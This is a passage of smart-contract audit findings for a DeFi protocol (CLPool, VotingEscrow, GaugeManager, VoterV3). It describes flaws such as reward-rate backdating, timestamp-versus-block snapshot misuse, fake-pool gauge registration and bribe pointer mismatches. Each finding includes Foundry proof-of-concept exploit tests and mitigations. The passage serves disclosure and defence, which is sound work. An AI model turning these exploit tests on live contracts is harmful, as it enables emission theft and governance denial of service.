// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.7.6;

import "ds-test/test.sol";
import "cl/contracts/core/CLPool.sol";
import "cl/contracts/core/interfaces/ICLFactory.sol";

interface Vm { function warp(uint256) external; function prank(address) external; }
contract Hevm { address constant HEVM_ADDRESS = address(uint160(uint256(keccak256("hevm cheat code")))); }

contract DummyFactory is ICLFactory {
    function poolImplementation() external view override returns (address) { return address(0); }
    function gaugeManager() external view override returns (IGaugeManager) { return IGaugeManager(address(0)); }
    function owner() external view override returns (address) { return address(0); }
    function swapFeeManager() external view override returns (address) { return address(0); }
    function protocolFeeManager() external view override returns (address) { return address(0); }
    function swapFeeModule() external view override returns (address) { return address(0); }
    function unstakedFeeManager() external view override returns (address) { return address(0); }
    function unstakedFeeModule() external view override returns (address) { return address(0); }
    function protocolFeeModule() external view override returns (address) { return address(0); }
    function defaultUnstakedFee() external view override returns (uint24) { return 0; }
    function defaultProtocolFee() external view override returns (uint24) { return 0; }
    function tickSpacingToFee(int24) external view override returns (uint24) { return 3000; }
    function tickSpacings() external view override returns (int24[] memory list) { list = new int24[](0); }
    function getPool(address,address,int24) external view override returns (address) { return address(0); }
    function allPools(uint256) external view override returns (address) { return address(0); }
    function allPoolsLength() external view override returns (uint256) { return 0; }
    function isPool(address) external view override returns (bool) { return false; }
    function getSwapFee(address) external view override returns (uint24) { return 3000; }
    function getUnstakedFee(address) external view override returns (uint24) { return 0; }
    function getProtocolFee(address) external view override returns (uint24) { return 0; }
    function createPool(address,address,int24,uint160) external override returns (address) { return address(0); }
    function setOwner(address) external override {}
    function setSwapFeeManager(address) external override {}
    function setUnstakedFeeManager(address) external override {}
    function setSwapFeeModule(address) external override {}
    function setUnstakedFeeModule(address) external override {}
    function setProtocolFeeManager(address) external override {}
    function setProtocolFeeModule(address) external override {}
    function setDefaultUnstakedFee(uint24) external override {}
    function enableTickSpacing(int24,uint24) external override {}
    function collectAllProtocolFees() external override {}
    function collectProtocolFees(address) external override returns (uint128,uint128) { return (0,0); }
}

contract SyncRewardBackdatingTest is DSTest {
    Vm constant vm = Vm(Hevm.HEVM_ADDRESS);
    CLPool pool;
    address factory = address(new DummyFactory());
    address token0 = address(0xA0);
    address token1 = address(0xB1);
    address gaugeManager = address(0xABCD);
    address gauge = address(0xBEEF);
    address nfpm = address(0xC0FFEE);

    function setUp() public {
        pool = new CLPool();
        // sqrtPriceX96 = 2^96 => tick ~ 0
        pool.initialize(factory, token0, token1, 60, gaugeManager, uint160(1 << 96));

        // set gauge and nft
        vm.prank(gaugeManager);
        pool.setGaugeAndPositionManager(gauge, nfpm);

        // add in-range staked liquidity so stakedLiquidity > 0
        (uint160 sp, int24 tick, uint16 oi, uint16 oc, uint16 ocn, bool unlocked) = pool.slot0();
        vm.prank(gauge);
        pool.stake(int128(1e9), tick - 1, tick + 1, true);
    }

    function test_SyncRewardBackdating_UsesNewRateForElapsedTime() public {
        // Configure initial rate r1 and large reserve
        uint256 r1 = 100;
        uint256 reserve1 = 1e24;
        vm.prank(gauge);
        pool.syncReward(r1, reserve1, block.timestamp + 7 days);

        // Let time pass without any settlement
        vm.warp(block.timestamp + 100); // dt = 100s

        // Reduce the rate to r2 before settlement
        uint256 r2 = 1;
        uint256 reserve2 = 1e24;
        vm.prank(gauge);
        pool.syncReward(r2, reserve2, block.timestamp + 7 days);

        // Settle now; this will incorrectly apply r2 to the entire dt since lastUpdated
        uint256 reserveBefore = pool.rewardReserve();
        vm.prank(gauge);
        pool.updateRewardsGrowthGlobal();
        uint256 reserveAfter = pool.rewardReserve();

        uint256 actualEmission = reserveBefore - reserveAfter;
        assertEq(actualEmission, r2 * 100, "Emission incorrectly backdated at new rate");

        // Sanity: if we had checkpointed before changing the rate, correct emission would be r1 * 100
        uint256 expectedCorrect = r1 * 100;
        assertEq(expectedCorrect - actualEmission, (r1 - r2) * 100, "Lost matured yield matches delta rates");
    }
}


## Suggested Mitigation
Settle accrued rewards before mutating the schedule. In syncReward(), call _updateRewardsGrowthGlobal() first so that time elapsed since lastUpdated is accounted at the previous rewardRate and deducted from the previous rewardReserve. Then write the new (rewardRate, rewardReserve, periodFinish). Example:

function syncReward(uint256 _rewardRate, uint256 _rewardReserve, uint256 _periodFinish) external lock onlyGauge {
    _updateRewardsGrowthGlobal(); // settle with old params
    rewardRate = _rewardRate;
    rewardReserve = _rewardReserve;
    periodFinish = _periodFinish;
    // Optional product choice:
    // - If you intend to carry over rewards accrued while stakedLiquidity == 0, add `rewardReserve += rollover;` then `delete rollover;`
    // - If you intend to discard those periods, keep deleting rollover as now.
}

This ensures temporal consistency across epoch boundaries and removes the rate backdating vulnerability.





 **Derived From** : IVotes/EIP-712 deviations: getPastVotes uses timestamp and domain typehash mismatch

## [M-39]. IVotes snapshot functions accept blockNumber but use timestamp, breaking block-based governance snapshots

## Derived From Pattern/Invariant
IVotes/EIP-712 deviations: getPastVotes uses timestamp and domain typehash mismatch

## Exploit Type
StandardViolation

## Location
VotingEscrow.getPastVotes,getPastTotalSupply

## Minimim Privilege Required
Permissionless

## Description
VotingEscrow claims IVotes compliance via IHybraVotes but implements snapshots as time-based. getPastVotes(address account, uint timestamp) and getPastTotalSupply(uint256 timestamp) treat the second param as a unix timestamp and call time-based lookups (VotingDelegationLib.getPastVotesIndex by timestamp; totalSupplyAtT). The IVotes spec requires block-based snapshots: getPastVotes(account, blockNumber) and getPastTotalSupply(blockNumber). Any integration (e.g., OZ Governor) that passes a blockNumber will be interpreted as a tiny timestamp (e.g., 18_000), leading to near-zero historical votes/total supply and governance DoS. Vulnerable code excerpts: getPastVotes: votes += VotingBalanceLogic.balanceOfNFT(tId, timestamp, votingBalanceLogicData); getPastTotalSupply: return totalSupplyAtT(timestamp);

## Impact
Any integration relying on IVotes semantics (e.g., OpenZeppelin Governor) will pass a blockNumber to getPastVotes/getPastTotalSupply. VotingEscrow interprets this as a Unix timestamp and queries time-based checkpoints, which for typical block numbers (e.g., ~20,000,000) map to timestamps near 1970 and return zero. This breaks quorum and majority calculations and can DoS proposals or governance actions that depend on past voting power or total supply snapshots. Funds are not directly at risk, but protocol governance and availability are impacted.

## Proof of Concept
Scenario: An IVotes consumer (e.g., OZ Governor) calls getPastVotes(account, snapshotBlock) where snapshotBlock = block.number - 1. VotingEscrow treats the second parameter as a timestamp and performs time-based lookups. Since snapshotBlock (≈ a few million) is interpreted as seconds since epoch (≈1970), it predates all checkpoints and returns zero voting power, even though the user had non-zero balance at that past block.

Steps:
1) User mints a veNFT by locking tokens.
2) Advance 1 block to establish a past blockNumber.
3) Call getPastVotes(user, block.number - 1) and getPastTotalSupply(block.number - 1). Both are interpreted as timestamps and return zero.
4) Compare against block-based helpers balanceOfAtNFT(tokenId, block.number - 1) and totalSupplyAt(block.number - 1), which return non-zero values.
5) A Governor proposal using these IVotes calls will observe near-zero historical votes/supply, preventing quorum and causing proposal failure.

## Proof of Code
pragma solidity 0.8.13;
import "forge-std/Test.sol";
import {VotingEscrow} from "../contracts/VotingEscrow.sol";
import {IVeArtProxy} from "../contracts/interfaces/IVeArtProxy.sol";

contract DummyArt is IVeArtProxy {
    function _tokenURI(uint, uint, uint, uint) external pure returns (string memory) { return "x"; }
}

contract MockERC20 {
    string public name = "MOCK"; string public symbol = "MOCK"; uint8 public decimals = 18;
    mapping(address=>uint) public balanceOf; mapping(address=>mapping(address=>uint)) public allowance;
    function mint(address to, uint amt) external { balanceOf[to] += amt; }
    function approve(address sp, uint amt) external returns (bool){ allowance[msg.sender][sp]=amt; return true; }
    function transfer(address to,uint amt) external returns (bool){ require(balanceOf[msg.sender]>=amt,"bal"); balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; return true; }
    function transferFrom(address f,address t,uint amt) external returns (bool){ uint al=allowance[f][msg.sender]; require(balanceOf[f]>=amt && al>=amt,"allow"); if(al!=type(uint).max){ allowance[f][msg.sender]=al-amt; } balanceOf[f]-=amt; balanceOf[t]+=amt; return true; }
}

contract IVotesTimestampMisuseTest is Test {
    MockERC20 token; VotingEscrow ve; DummyArt art;
    address user = address(0xBEEF);

    function setUp() public {
        token = new MockERC20();
        art = new DummyArt();
        ve = new VotingEscrow(address(token), address(art));
        token.mint(user, 1e24);
        vm.prank(user); token.approve(address(ve), type(uint).max);
        // Warp to a clean start time and create a 2-week lock (HybraTimeLibrary.WEEK=1800 in this build)
        vm.warp(1_700_000_000);
        vm.prank(user);
        ve.create_lock(1e21, 3600); // 2 epochs
    }

    function test_getPastVotes_usesTimestampNotBlockNumber() public {
        // Move 1 block ahead so pastBlock is a valid snapshot point
        vm.roll(block.number + 1);
        uint pastBlock = block.number - 1;
        uint nftId = 1;

        // Correct block-based user votes via per-NFT API
        uint correct = ve.balanceOfAtNFT(nftId, pastBlock);
        // Wrong: IVotes method misinterprets blockNumber as timestamp
        uint wrong = ve.getPastVotes(user, pastBlock);

        assertGt(correct, 0, "expected non-zero voting power at past block");
        assertEq(wrong, 0, "IVotes.getPastVotes misinterprets blockNumber as timestamp");
    }

    function test_getPastTotalSupply_blockVsTime() public {
        vm.roll(block.number + 1);
        uint pastBlock = block.number - 1;

        uint correctTS = ve.totalSupplyAt(pastBlock);
        uint wrongTS = ve.getPastTotalSupply(pastBlock); // treated as timestamp

        assertGt(correctTS, 0, "non-zero global past supply at block");
        assertEq(wrongTS, 0, "IVotes.getPastTotalSupply misinterprets blockNumber as timestamp");
    }
}


## Suggested Mitigation
Make IVotes methods block-based. Specifically:
- getPastVotes(address account, uint256 blockNumber): compute votes at the given block using the tokenId set from the appropriate delegation checkpoint at that block, then sum VotingBalanceLogic.balanceOfAtNFT(tokenId, blockNumber, ...).
  • To locate the correct checkpoint, derive the block’s timestamp using the existing global point_history mapping (same interpolation used in VotingBalanceLogic.balanceOfAtNFT) and then select the delegation checkpoint at or before that derived timestamp. Alternatively, extend VotingDelegationLib.Checkpoint to also store block numbers, and binary-search by block directly.
- getPastTotalSupply(uint256 blockNumber): return VotingBalanceLogic.totalSupplyAt(blockNumber, ...).
- If time-based helpers are needed, expose them under distinct names (e.g., getPastVotesAtTime, totalSupplyAtT) and DO NOT implement IVotes unless methods follow block-number semantics.
- Optional hardening: add explicit parameter naming and NatSpec stating that getPastVotes/getPastTotalSupply expect block numbers, and add tests mirroring OZ Governor snapshot calls.





 **Derived From** : CL gauge creation bypasses pool authenticity checks (any contract can be gauged)

## [M-40]. Permissionless creation of CL gauges for arbitrary contracts enables emission sink and untrusted external calls

## Derived From Pattern/Invariant
CL gauge creation bypasses pool authenticity checks (any contract can be gauged)

## Exploit Type
AuthByPass

## Location
GaugeManager._createGauge

## Minimim Privilege Required
Permissionless

## Description
In GaugeManager._createGauge, when _gaugeType == 1 (CL), the code unconditionally sets isPair = true and never verifies that _pool was deployed by the approved CL factory. Any contract exposing token0()/token1() passes validation. The function then: (1) deploys gauge and bribes for this arbitrary address, (2) calls ICLPool(_pool).setGaugeAndPositionManager(_gauge, nfpm) on an untrusted contract, and (3) approves the newly created gauge for unlimited base token allowance. As a result, an attacker can register fake pools, get a valid gauge, bribe voters to direct emissions to that gauge, and cause GaugeManager to transfer weekly emissions to a gauge that cannot be used by real LPs (deposit checks later bind to the legitimate CLFactory), effectively sinking emissions and polluting the registry. Vulnerable snippet:

if(_gaugeType == 1) {
    // removed due to code size
    // require(_pool_hyper == _pool_factory, 'wrong tokens');
    isPair = true;
}
...
_gauge = IGaugeFactoryCL(_gaugeFactory).createGauge(..., _pool, ...);
ICLPool(_pool).setGaugeAndPositionManager(_gauge, nfpm);
IERC20(base).approve(_gauge, type(uint256).max);


## Impact
Because _gaugeType==1 (CL) sets isPair=true without validating that _pool was deployed by the approved CL factory, an attacker can register any contract with token0()/token1() as a CL pool and get a legitimate gauge + bribes. Voters can then be bribed to allocate weight to that fake pool. GaugeManager will stream weekly HYBR emissions to the corresponding gauge, but no real LP can stake (GaugeCL deposits only accept NFTs whose pool matches the approved factory), so rewards become permanently stuck in the gauge contract. This diverts emissions away from real LPs (DoS of liquidity mining) and pollutes the registry. Assets are not stolen by the attacker, but emissions are burned/stranded, degrading protocol function and value.

## Proof of Concept
Scenario:
1) Attacker deploys a fake pool contract that returns whitelisted token0/token1 and a noop setGaugeAndPositionManager().
2) Anyone calls GaugeManager.createGauge(fakePool, 1) (permissionless). Because the CL branch unconditionally sets isPair=true and does not verify the factory, gauge creation succeeds and GaugeManager also calls setGaugeAndPositionManager on the untrusted pool.
3) With sufficient bribes, voters direct weight to the fake pool. The Minter sends HYBR to GaugeManager via notifyRewardAmount, and distributeAll() routes the pro‑rata share to the attacker’s gauge. Since real CL positions are minted against the legitimate NFPM factory, no position will match the fake pool address, so no one can stake to earn rewards. Emissions transferred to the gauge remain stuck.
4) Result: emissions sink (permanent loss of weekly rewards) and registry pollution.

Notes:
- The exploit requires only that the attacker chooses whitelisted tokens and can influence votes (e.g., via bribes). No admin role is needed.

## Proof of Code
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {GaugeManager} from "contracts/GaugeManager.sol";
import {IERC20} from "contracts/interfaces/IERC20.sol";
import {IVotingEscrow} from "contracts/interfaces/IVotingEscrow.sol";
import {IPermissionsRegistry} from "contracts/interfaces/IPermissionsRegistry.sol";
import {ITokenHandler} from "contracts/interfaces/ITokenHandler.sol";
import {IGaugeFactoryCL} from "contracts/interfaces/IGaugeFactoryCL.sol";
import {IVoter} from "contracts/interfaces/IVoter.sol";

contract MockERC20 is IERC20 {
    string public name; string public symbol; uint8 public decimals = 18;
    mapping(address=>uint256) public override balanceOf;
    mapping(address=>mapping(address=>uint256)) public override allowance;
    uint256 public override totalSupply;
    constructor(string memory n, string memory s){name=n;symbol=s;}
    function mint(address to,uint256 amt) external {balanceOf[to]+=amt; totalSupply+=amt;}
    function transfer(address to,uint256 amt) external override returns(bool){require(balanceOf[msg.sender]>=amt); balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; return true;}
    function approve(address sp,uint256 amt) external override returns(bool){allowance[msg.sender][sp]=amt; return true;}
    function transferFrom(address from,address to,uint256 amt) external override returns(bool){require(balanceOf[from]>=amt); require(allowance[from][msg.sender]>=amt); allowance[from][msg.sender]-=amt; balanceOf[from]-=amt; balanceOf[to]+=amt; return true;}
}

contract MockVotingEscrow is IVotingEscrow {
    address public _token;
    constructor(address t){_token=t;}
    function token() external view returns(address){return _token;}
}

contract MockPermissionsRegistry is IPermissionsRegistry {
    function emergencyCouncil() external pure returns(address){return address(0xE);}    
    function hybraTeamMultisig() external pure returns(address){return address(0xBEEF);} 
    function hasRole(bytes memory, address) external pure returns(bool){return true;}  
}

contract MockTokenHandler is ITokenHandler {
    function isWhitelisted(address) external pure returns (bool){return true;}
    function isWhitelistedNFT(uint256) external pure returns (bool){return true;}
    function isConnector(address) external pure returns (bool){return true;}
    function whitelistToken(address) external {}
    function blacklistToken(address) external {}
    function whiteListed(uint256) external view returns (address){return address(0);} 
    function connectors(uint256) external view returns (address){return address(0);} 
    function whiteListedTokensLength() external view returns (uint256){return 0;} 
    function connectorTokensLength() external view returns (uint256){return 0;} 
    function whiteListedTokens() external view returns(address[] memory tokens){tokens = new address[](0);} 
    function connectorTokens() external view returns(address[] memory tokens){tokens = new address[](0);} 
}

contract MockBribe { }

contract MockBribeFactory {
    function createBribe(address, address, address, string memory) external returns (address) {
        return address(new MockBribe());
    }
}

// IMPORTANT: expose public emergency getter so GaugeManager._distribute()'s IGauge(_g).emergency() check does not revert
contract MockGaugeCL {
    IERC20 public rewardToken;
    bool public emergency; // default false
    uint256 public lastNotified;
    constructor(address _rewardToken){rewardToken = IERC20(_rewardToken);} 
    function notifyRewardAmount(address token, uint256 amount) external returns (uint256) {
        require(token == address(rewardToken), "token");
        require(rewardToken.transferFrom(msg.sender, address(this), amount));
        lastNotified += amount;
        return 0;
    }
}

contract MockGaugeFactoryCL is IGaugeFactoryCL {
    address[] internal _ga;
    function createGauge(address _rewardToken,address ,address ,address , address , address , bool , address ) external override returns (address) {
        address g = address(new MockGaugeCL(_rewardToken));
        _ga.push(g);
        return g;
    }
    function gauges(uint256 i) external view override returns(address){return _ga[i];}
    function length() external view override returns(uint){return _ga.length;}
}

contract MaliciousPool {
    address public t0; address public t1; address public lastGauge; address public lastNfpm;
    constructor(address _t0, address _t1){t0=_t0; t1=_t1;}
    function token0() external view returns(address){return t0;}
    function token1() external view returns(address){return t1;}
    function setGaugeAndPositionManager(address g, address n) external { lastGauge=g; lastNfpm=n; }
}

contract MockVoter is IVoter {
    mapping(address=>uint256) public _weights; uint256 public _totalWeight;
    function ve() external pure returns(IVotingEscrow){return IVotingEscrow(address(0));}
    function vote(uint256, address[] calldata, uint256[] calldata) external {}
    function gauges(address) external pure returns(address){return address(0);} 
    function gaugeToFees(address) external pure returns(address){return address(0);} 
    function gaugeToBribes(address) external pure returns(address){return address(0);} 
    function createGauge(address, address) external pure returns (address){return address(0);} 
    function distribute(address) external {}
    function factoryRegistry() external pure returns (address){return address(0);} 
    function distribute(address[] memory) external {}
    function isAlive(address) external pure returns (bool){return true;}
    function killGauge(address) external {}
    function emergencyCouncil() external pure returns (address){return address(0);} 
    function claimRewards(address[] memory) external {}
    function claimFees(address[] memory, address[][] memory, uint256) external {}
    function totalWeight() external view returns (uint256){return _totalWeight;}
    function weights(address p) external view returns (uint256){return _weights[p];}
    // helpers
    function setWeight(address p, uint256 w) external {_weights[p]=w;}
    function setTotalWeight(uint256 tw) external {_totalWeight=tw;}
}

contract GaugeManager_CLPoolBypass_Test is Test {
    GaugeManager manager;
    MockERC20 base;
    MockVotingEscrow ve;
    MockPermissionsRegistry pr;
    MockTokenHandler th;
    MockGaugeFactoryCL gfcl;
    MockBribeFactory bf;
    MockVoter voter;

    // Make this test contract the minter to satisfy msg.sender==minter and update_period() calls
    function update_period() external returns (uint256) { return block.timestamp; }

    function setUp() public {
        base = new MockERC20("HYBR","HYBR");
        ve = new MockVotingEscrow(address(base));
        pr = new MockPermissionsRegistry();
        th = new MockTokenHandler();
        gfcl = new MockGaugeFactoryCL();
        bf = new MockBribeFactory();
        voter = new MockVoter();

        manager = new GaugeManager();
        // Fill factories slots: [v2, cl]
        address dummyV2GaugeFactory = address(0x1001);
        address dummyV2PairFactory = address(0x1002);
        manager.initialize(address(ve), address(th), dummyV2GaugeFactory, address(gfcl), dummyV2PairFactory, address(0x2002), address(pr), address(0xA));
        manager.setBribeFactory(address(bf));
        manager.setVoter(address(voter));
        manager.setMinter(address(this));
    }

    function test_CLGaugeCreationBypassAndEmissionSink() public {
        // Malicious pool not from approved CLFactory
        address tokenA = address(new MockERC20("USDC","USDC"));
        address tokenB = address(new MockERC20("WETH","WETH"));
        MaliciousPool pool = new MaliciousPool(tokenA, tokenB);

        // Attacker creates a CL gauge for arbitrary pool
        (address gauge,,) = manager.createGauge(address(pool), 1);
        assertTrue(manager.isGauge(gauge), "gauge not registered");
        assertEq(manager.poolForGauge(gauge), address(pool), "wrong pool mapping");
        assertEq(pool.lastGauge(), gauge, "setGaugeAndPositionManager not called on pool");

        // Configure voting weights and fund
        voter.setTotalWeight(1e18);
        voter.setWeight(address(pool), 1e18);

        base.mint(address(this), 100 ether);
        base.approve(address(manager), type(uint256).max);
        manager.notifyRewardAmount(100 ether);

        // Distribute to all gauges: should transfer HYBR from manager to the fake gauge via transferFrom
        manager.distributeAll();
        assertGt(base.balanceOf(gauge), 0, "emissions not transferred to gauge");
    }
}


## Suggested Mitigation
Validate CL pool authenticity before creating a CL gauge and before calling setGaugeAndPositionManager:
- For _gaugeType == 1 (CL), require the pool to be from the approved CL factory. Two robust options:
  1) Direct factory membership check:
     require(ICLFactory(_factoriesData.pairFactories[1]).isPool(_pool), "!POOL");
  2) Deterministic address recomputation using PoolAddress: read token0/token1 and tickSpacing from ICLPool(_pool), then
     PoolAddress.PoolKey memory key = PoolAddress.PoolKey({token0: tokenA, token1: tokenB, tickSpacing: tickSpacing});
     require(_pool == PoolAddress.computeAddress(_approvedCLFactory, key), "WRONG_POOL");

Only after passing the check should you:
- Deploy the CL gauge via the trusted CL gauge factory
- Call ICLPool(_pool).setGaugeAndPositionManager(_gauge, nfpm)

Optionally, add a sanity check that ICLPool(_pool) exposes the expected factory/NFPM (if available) and revert otherwise. This fully prevents emission sinks to fake pools and avoids untrusted external calls on arbitrary contracts.


## [M-41]. Registry pollution via fake CL pools leads to unbounded pools[] growth and operational DoS

## Derived From Pattern/Invariant
CL gauge creation bypasses pool authenticity checks (any contract can be gauged)

## Exploit Type
AuthByPass

## Location
GaugeManager._createGauge

## Minimim Privilege Required
Permissionless

## Description
Because GaugeManager accepts any address as a CL pool (gaugeType==1 sets isPair=true), an attacker can repeatedly create gauges for arbitrary contracts returning whitelisted token0()/token1(). Each call appends the fake pool to pools[]. Manager methods iterate pools[] (e.g., distributeFees(), distributeAll()) and may exceed gas limits or become impractical as the array grows, causing protocol operational DoS without any privileged role.

## Impact
Any user can permissionlessly create CL gauges for arbitrary contracts because _createGauge() unconditionally trusts _gaugeType==1 pools (isPair=true). This lets an attacker register malicious or non-compliant "pools" into pools[], and each addition creates a GaugeCL. Manager methods that iterate pools (distributeFees() and distributeAll()) then interact with these gauges. GaugeCL invokes pool methods (e.g., collectFees(), updateRewardsGrowthGlobal(), syncReward()), which will revert on fake pools, causing the entire iteration to revert and halting operational flows. Even if governance kills such gauges later, an attacker can repeatedly bloat pools[] to increase gas cost of loops, degrading liveness and automation. While capital is not directly stolen, core protocol operations (fees claiming and weekly emissions distribution) can be blocked or made impractical, which fits a Medium severity under availability/risk to protocol function.

## Proof of Concept
Attack outline
1) Attacker deploys a FakeCLPool that only implements token0(), token1(), and setGaugeAndPositionManager(). It returns whitelisted tokens (one must be a connector) so it passes TokenHandler checks.
2) Because GaugeManager._createGauge trusts CL pools (gaugeType==1 sets isPair=true without any authenticity check), the attacker calls createGauge(fakePool, 1). This pushes fakePool into pools[] and deploys a GaugeCL via the configured CL gauge factory.
3) Later, Manager.distributeFees() iterates pools[] and calls IGaugeCL(gauge).claimFees(). GaugeCL.claimFees() attempts to call clPool.collectFees(), which will revert for the fake pool, causing the entire Manager call to revert (DoS).
4) Similarly, Manager.distributeAll() calls IGaugeCL(gauge).notifyRewardAmount(), and GaugeCL.notifyRewardAmount() calls clPool.updateRewardsGrowthGlobal()/syncReward(), which also revert on fake pools, DoS-ing emissions distribution. Repeating step 2 many times bloats pools[] to increase gas and operational overhead across all loops.

## Proof of Code
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {GaugeManager} from "contracts/GaugeManager.sol";

// Minimal malicious CL gauge: reverts on fee claim and reward notify
contract MaliciousGaugeCL {
    function claimFees() external pure returns (uint256, uint256) {
        revert("malicious gauge");
    }
    function notifyRewardAmount(address, uint256) external pure returns (uint256) {
        revert("malicious gauge");
    }
}

// Mock CL GaugeFactory that always returns a malicious gauge
contract MockGaugeFactoryCL {
    function createGauge(
        address, address, address, address, address, address, bool, address
    ) external returns (address) {
        return address(new MaliciousGaugeCL());
    }
    function gauges(uint256) external pure returns (address) { return address(0); }
    function length() external pure returns (uint) { return 0; }
}

// Dummy bribe + factory to satisfy GaugeManager._deployBribes()
contract Dummy {}
contract DummyBribeFactory {
    function createBribe(address, address, address, string memory) external returns (address) {
        return address(new Dummy());
    }
}

// PermissionsRegistry mock: grant all roles; provide required getters
contract MockPermissionsRegistry {
    function hasRole(bytes memory, address) external pure returns (bool) { return true; }
    function hybraTeamMultisig() external pure returns (address) { return address(0xBEEF); }
    function emergencyCouncil() external pure returns (address) { return address(0xDEAD); }
}

// TokenHandler mock with simple whitelist/connector flags
contract MockTokenHandler {
    mapping(address => bool) wl; mapping(address => bool) conn;
    function isWhitelisted(address t) external view returns (bool) { return wl[t]; }
    function isConnector(address t) external view returns (bool) { return conn[t]; }
    function set(address t, bool w, bool c) external { wl[t] = w; conn[t] = c; }
}

// Minimal ERC20 to satisfy approve() calls
contract ERC20Mock {
    string public name; string public symbol; uint8 public decimals = 18;
    mapping(address => mapping(address => uint256)) public allowance;
    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
}

// Mock VotingEscrow exposing base token used by GaugeManager
contract MockVE { address _token; constructor(address t){ _token = t; } function token() external view returns(address){ return _token; } }

// Fake CL pool with minimal surface used by GaugeManager._createGauge
contract FakeCLPool {
    address public t0; address public t1; address public gauge; address public nfpm;
    constructor(address _t0, address _t1){ t0 = _t0; t1 = _t1; }
    function token0() external view returns(address){ return t0; }
    function token1() external view returns(address){ return t1; }
    function setGaugeAndPositionManager(address g, address n) external { gauge = g; nfpm = n; }
}

contract GaugeManager_RegistryPollution_DoS_Test is Test {
    GaugeManager manager;
    MockTokenHandler handler;
    MockPermissionsRegistry perms;
    DummyBribeFactory bribes;
    MockGaugeFactoryCL gfacCL;
    ERC20Mock base;
    MockVE ve;

    function setUp() public {
        // Base token and ve
        base = new ERC20Mock("HYBR","HYBR");
        ve = new MockVE(address(base));

        // Mocks
        handler = new MockTokenHandler();
        perms = new MockPermissionsRegistry();
        gfacCL = new MockGaugeFactoryCL();
        address v2GF = address(new Dummy()); // placeholder non-zero
        address v2PF = address(new Dummy()); // placeholder non-zero
        address clPF = address(0x1234);      // non-zero, not used by code path

        // Deploy and initialize GaugeManager
        manager = new GaugeManager();
        manager.initialize(
            address(ve),                // __ve
            address(handler),           // tokenHandler
            v2GF,                       // _gaugeFactory (v2)
            address(gfacCL),            // _gaugeFactoryCL
            v2PF,                       // _pairFactory (v2)
            clPF,                       // _pairFactoryCL (non-zero)
            address(perms),             // permissionsRegistry
            address(0x9999)             // nfpm
        );

        // Set bribe factory (our mock allows any caller as GAUGE_ADMIN)
        bribes = new DummyBribeFactory();
        manager.setBribeFactory(address(bribes));

        // Whitelist tokens; one must be a connector
        address usdc = address(new ERC20Mock("USDC","USDC"));
        address weth = address(new ERC20Mock("WETH","WETH"));
        handler.set(usdc, true, true);
        handler.set(weth, true, false);

        // Create a fake CL pool and permissionlessly register a gauge for it
        address fake = address(new FakeCLPool(usdc, weth));
        manager.createGauge(fake, 1); // gaugeType == 1 (CL)
    }

    function test_DistributeFees_Reverts_DueTo_MaliciousGauge() public {
        // Single fake pool present => malicious gauge claimFees() reverts => manager.distributeFees() reverts
        vm.expectRevert();
        manager.distributeFees();
    }
}


## Suggested Mitigation
Enforce CL pool authenticity and make loops resilient:
- Validation: when _gaugeType == 1, check the pool against the approved CL factory. For example:
  
  address _factory = _factoriesData.pairFactories[_gaugeType];
  require(_factory != address(0), "ZA");
  require(ICLFactory(_factory).isPool(_pool), "!POOL");
  
  Optionally, verify token0/token1 from the pool match the provided whitelist and that the pool’s factory matches _factory (e.g., derive expected pool via getPool(token0, token1, tickSpacing) if you store tickSpacing).
- Hardening: wrap per-gauge external calls in try/catch to prevent one bad gauge from reverting the entire batch. For example in _distributeFees and _distribute, use try {...} catch { /* skip failed gauge */ } so operations proceed for healthy gauges.
- Hygiene: consider allowing governance to prune or quarantine broken gauges (e.g., a blacklist map checked before iteration) and/or maintain a separate iterable set of alive gauges, so pools[] cannot be abused for gas griefing.





 **Derived From** : For each pool in poolVote[tokenId] after the call: votes[tokenId][pool] > 0 and gaugeManager.isGaugeAliveForPool(pool) == true at vote time

## [M-42]. Bribe pointer rotation breaks Voter↔Bribe referential integrity: reset withdraws from new bribes, leaving old bribes credited and enabling double accrual

## Derived From Pattern/Invariant
For each pool in poolVote[tokenId] after the call: votes[tokenId][pool] > 0 and gaugeManager.isGaugeAliveForPool(pool) == true at vote time

## Exploit Type
EventConsistency

## Location
VoterV3.reset

## Minimim Privilege Required
Permissionless

## Description
VoterV3 records only pool addresses and looks up bribe contracts at execution time via GaugeManager.fetchInternal/ExternalBribeFromPool(pool). On vote/poke, weight is deposited into the bribes returned at that time. On reset, VoterV3 loops poolVote[tokenId] and withdraws from whatever bribes GaugeManager currently points to. If governance rotates a pool’s bribe addresses (setInternalBribeFor/setExternalBribeFor) or migrates/renews the gauge’s bribes between vote and reset, VoterV3 will attempt to withdraw from the NEW bribe contracts rather than the ones it originally deposited to. The Bribe.withdraw implementation is permissive and only decrements when amount <= balanceOf[tokenId]; calling it on the wrong bribe is a no-op, leaving the old bribe’s balanceOf[tokenId] unchanged. After reset, VoterV3 clears its own votes and poolVote, and the user can revote to the new bribe, while their weight remains credited in the old bribe. This referential mismatch lets voters continue to accrue/claim rewards from the old bribe (e.g., if third parties keep funding it or misdirect bribes to the outdated address), effectively double-dipping against the invariant that recorded votes map to active bribe weight.

## Impact
Functional state break and potential monetary loss for bribe depositors: voters can retain weight on old bribe while revoting to the new bribe. If any rewards continue to flow to the old bribe (e.g., partner misdirected incentives), the voter claims from both old and new bribes. Also inflates old bribe supply permanently, diluting correct claim shares.

## Proof of Concept
1) User votes to pool P when GaugeManager points P→Bribe A (internal/external). VoterV3 deposits weight to A.
2) Governance rotates bribes for P to Bribe B (setInternalBribeFor/setExternalBribeFor), or migrates the gauge.
3) User calls VoterV3.reset(tokenId). VoterV3 fetches current bribes for P (now B) and calls withdraw(amount, tokenId) on B. Since user never deposited into B, Bribe.withdraw does nothing (amount > balanceOf[tokenId] ⇒ no state change). VoterV3 still zeros votes mapping and clears poolVote.
4) User revotes to P (now depositing to B). The old Bribe A still shows balanceOf[tokenId] from step 1. If any rewards are later notified to A (e.g., external bribers deposit to the old address in error), user can claim them while also participating in B.
Result: Referentials between VoterV3’s saved votes and actual Bribe balances diverge permanently; user can double-accrue/claim in certain flows.

## Proof of Code
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../contracts/VoterV3.sol";
import "../contracts/libraries/HybraTimeLibrary.sol";

interface IMockVE {
    function setOwner(uint tokenId, address owner) external;
